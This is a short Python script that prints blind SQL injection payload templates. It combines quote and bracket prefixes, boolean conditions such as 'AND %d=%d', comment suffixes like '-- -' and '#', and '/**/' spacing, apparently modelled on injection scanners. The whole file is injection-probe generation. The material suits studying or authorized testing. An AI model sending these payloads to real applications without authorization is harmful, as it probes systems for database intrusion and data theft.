#!/usr/local/bin/python
# -*- coding:utf-8 -*-
# @Time    : 2019/5/4 4:37 PM
# @Author  : Jerry
# @Desc    : 
# @File    : generate_template.py

import itertools

PREFIXES = (" ", ") ", "' ", "') ")  # prefix values used for # 前缀
SUFFIXES = ("", "-- -", "#", "%%16")  # suffix values used for # 后缀

BOOLEAN_TESTS = ("AND %d=%d", "OR NOT (%d>%d)")  # boolean tests used for building testing blind

vulnerable = False
num = 0
for prefix, boolean, suffix, inline_comment in itertools.product(PREFIXES, BOOLEAN_TESTS, SUFFIXES,
                                                                 (False, True)):
    num += 1
    if not vulnerable:
        template = ("%s%s%s" % (prefix, boolean, suffix)).replace(" " if inline_comment else "/**/","/**/")  # 生成payload模板
        print template

print num